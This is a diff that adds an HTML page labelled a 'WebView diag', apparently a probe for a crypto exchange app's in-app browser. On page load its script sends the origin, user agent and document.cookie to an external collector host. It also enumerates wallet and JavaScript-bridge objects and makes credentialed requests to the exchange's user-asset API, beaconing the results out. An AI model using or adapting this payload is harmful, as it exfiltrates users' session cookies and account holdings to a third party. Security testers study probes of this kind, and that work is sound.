@@ -1,0 +1,39 @@
+<!doctype html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<title>OKX WebView diag</title>
+<style>
+  html,body{margin:0;padding:0;background:#000;color:#0f0;font:14px monospace;-webkit-text-size-adjust:100%}
+  pre{padding:12px;white-space:pre-wrap;word-break:break-all}
+</style>
+</head><body><pre id=o>booting…
+</pre><script>
+const COLLECT = 'https://xdhrflssxhuownkbsbgks7myap3kv1oo6.oast.fun/c';   // <-- change to your host
+const o = document.getElementById('o');
+function w(s){ o.textContent += s + '\n'; try{ navigator.sendBeacon(COLLECT+'?l='+encodeURIComponent(s)); }catch(e){} }
+
+window.onerror = (m,s,l,c,e) => w('JS_ERR: '+m+' @'+s+':'+l);
+
+w('origin='+location.origin);
+w('UA='+navigator.userAgent);
+w('cookie='+(document.cookie||'(empty)'));
+w('webkit.messageHandlers='+(window.webkit&&window.webkit.messageHandlers?Object.keys(window.webkit.messageHandlers).join(','):'(none)'));
+
+const NAMES = ['ethereum','okxwallet','okexchain','solana','okxSolana','aptos','okxAptos',
+               'sui','okxSui','bitcoin','okxBitcoin','tronWeb','okxTron','starknet','okxStarknet',
+               'OKApp','OKEXApp','OKXApp','OKBridge','OKWebView','okJsBridge','okxJsBridge',
+               'JSBridge','CompatibleBridge','okMiniProgram','NewsBridge','AndroidJSBridge',
+               'WebViewJavascriptBridge','OkexBridge','okx','okex','OKDAppBridge','OKNFTBridge'];
+NAMES.forEach(n => { if(window[n]) { let m=''; try{m=Object.keys(window[n]).slice(0,15).join(',');}catch(e){} w('HAS '+n+' :: '+m); } });
+
+// passive cookie/CORS reach to okx.com (no user gesture needed)
+fetch('https://www.okx.com/api/v5/public/time',{credentials:'include'})
+  .then(r=>r.text()).then(t=>w('okx-public='+t.slice(0,120)))
+  .catch(e=>w('okx-public-err='+e.message));
+fetch('https://www.okx.com/priapi/v1/earn/user-asset?valuationUnit=USD',{credentials:'include'})
+  .then(r=>r.text()).then(t=>w('user-asset='+t.slice(0,200)))
+  .catch(e=>w('user-asset-err='+e.message));
+
+w('diag done.');
+</script></body></html>
